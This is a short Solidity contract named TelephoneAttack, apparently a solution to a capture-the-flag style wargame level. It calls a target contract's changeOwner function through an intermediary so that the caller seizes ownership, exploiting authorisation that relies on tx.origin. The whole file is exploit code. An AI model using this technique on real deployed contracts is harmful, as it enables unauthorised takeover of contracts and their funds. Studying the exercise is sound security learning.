// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {

    Telephone public telephone;

    constructor(address telephoneAddress) {
        telephone = Telephone(telephoneAddress);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}